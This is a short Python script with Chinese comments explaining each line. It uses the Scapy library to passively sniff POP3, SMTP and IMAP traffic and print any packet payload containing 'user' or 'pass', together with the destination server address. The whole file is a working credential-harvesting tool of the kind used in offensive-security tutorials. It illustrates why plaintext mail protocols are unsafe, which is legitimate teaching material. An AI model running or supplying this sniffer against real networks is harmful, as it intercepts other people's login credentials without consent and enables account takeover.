# 导入 Scapy 库，用于网络数据包的捕获和分析
from scapy.all import *

# 定义回调函数，处理捕获到的每个数据包
def packet_callback(packet):
    # 检查数据包是否包含 TCP 有效载荷
    if packet[TCP].payload:
        # 将 TCP 有效载荷转换为字符串
        mail_packet = str(packet[TCP].payload)
        # 检查有效载荷是否包含 "user" 或 "pass"（不区分大小写）
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            # 打印目标服务器的 IP 地址
            print("[*] Server: %s" % packet[IP].dst)
            # 打印 TCP 有效载荷内容
            print("[*] %s" % packet[TCP].payload)

# 启动数据包嗅探
# filter: 使用 BPF 过滤器，仅捕获 TCP 协议且端口为 110（POP3）、25（SMTP）或 143（IMAP）的流量
# prn: 指定回调函数 packet_callback，处理每个捕获的数据包
# store=0: 不存储捕获的数据包，节省内存
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)